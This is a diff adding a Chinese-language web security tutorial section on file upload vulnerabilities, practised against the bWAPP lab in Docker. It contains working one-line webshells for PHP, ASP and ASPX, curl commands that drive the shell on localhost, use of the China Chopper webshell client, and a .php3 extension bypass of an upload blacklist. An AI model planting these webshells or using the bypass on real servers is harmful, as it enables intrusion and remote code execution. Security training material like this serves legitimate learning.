@@ -496,27 +496,155 @@
 
 
 
+## 后端安全
+
+### 文件上传漏洞是什么？
+
+- 文件上传（File Upload）是大部分Web应用都具备的功能，例如用户上传附件、改头像、分享图片等。
+- 文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可以是木马、病毒、恶意脚本或者Webshell等。 
+
+
+
+### Docker 使用
+
+- 官网
+  - https://www.docker.com/
+- 下载安装，并启动
+- 安装成功： docker -v
+- 下载 Docker 镜像
+  - docker pull registry.cn-shanghai.aliyuncs.com/yhskc/bwapp 
+- 启动
+  - docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/bwapp 
+- 查看启动应用
+  - docker container list -a
+  - docker ps
+  - 关闭 容器：docker stop zealous_heyrovsky
+  - 启动 已经存在的容器：docker start zealous_heyrovsky
+
+
+
+### Webshell
+
+- 启动 bwapp  应用
+- 访问应用
+  - http://127.0.0.1/login.php
+- 初始化应用
+  - http://127.0.0.1/install.php
+  - click heren to install bWAPP
+- 注册账号
+  - root
+  - root1234
+- 登录用户
+- 选择文件上传功能
+  - Choose your bug: Unrestricted File Upload
+  - 点击 Hack
+- 编辑木马文件
+
+```php
+// shell.php
+
+<?php @eval($_POST['hacker']); ?>
+```
+
+- 上传木马文件
+  - 选择文件
+  - upload
+- 查看上传木马文件
+  - http://127.0.0.1/images/shell.php
+- 让 Webshell 执行 PHP 的 API 命令
+  - get_current_user()
+  - getcwd()
+
+```sh
+curl -d "hacker=echo get_current_user();" http://127.0.0.1/images/shell.php
+
+curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
+```
+
+![1617006814673](HackerMeWeb.assets/1617006814673.png)
+
+
+
+### 中国菜刀
+
+- 简介：中国菜刀是一个 Webshell 集成环境 
+- 下载链接
+  - https://github.com/raddyfiy/caidao-official-version
+  - 做 MD5 校验，杜绝黑吃黑
+- 双击打开 caidao.exe --> 右键添加 SHELL --> 写入地址 与 变量 --> 双击进入服务器目录
+- 右键打开 虚拟终端 --> 执行端口查询命令 $ netstat -an | grep ESTABLISHED
 
 
 
 
 
+### 一句话木马
+
+- asp 一句话木马：
+  - <%execute(request("value"))%> 
+- php 一句话木马：
+  - <?php @eval($_POST[“value”]);?> 
+- aspx 一句话木马：
+  - <%@ Page Language="Jscript"%>
+  - <%eval(Request.Item["value"])%> 
+- 其他一句话木马 
+  - <%eval request("value")%>
+  - <%execute request("value")%>
+  - <%execute(request("value"))%> 
 
 
 
+### 后缀名绕过
 
+- 设置安全等级：Set your security level: **medium**
 
+- 上传文件: upload shell.php
 
+  - 上传失败
+  - Sorry, the file extension is not allowed. The following extensions are blocked: **asp, aspx, dll, exe, jsp, php**
 
+- 更改文件名：upload shell.php3
 
+  - 上传成功
+  - 中国菜刀进入成功
 
+- 更改文件名：upload shell.php30
 
+  - 上传成功
+  - 中国菜刀进入失败
 
+- 思考：后缀名改为 .php3，尝试绕过可以，为什么 .php30 后缀不行呢？ 
 
+- 后缀名绕过原理
 
+  - 显示所有运行的容器：docker ps
+  - 进入docker交互的shell 中：docker exec -it fffcfba80832 bash
+  - 查看网络连接：netstat -antp
+  - 查看网络连接并过滤80端口：netstat -antp| grep 80
+  - 找到 apache2 的配置文件目录： cd /etc/apache2/
+  - 查看配置文件：vim apache2.conf
+  - 找到module加载配置：
 
+  ```sh
+  # Include module configuration:
+  IncludeOptional mods-enabled/*.load
+  IncludeOptional mods-enabled/*.conf  # 加载配置
+  ```
 
+  - 进入：cd mods-enabled
+  - 找到php5.conf配置文件 ，并打开，查看源码
 
+  ```sh
+  # 根据匹配规则，可以匹配到php,php3,php4,php5,phpt,phptml
+  
+  <FilesMatch ".+\.ph(p[345]?|t|tml)$">  
+      SetHandler application/x-httpd-php
+  </FilesMatch>
+  ```
+
+  
+
+### 服务器关联型漏洞 
 
 
 
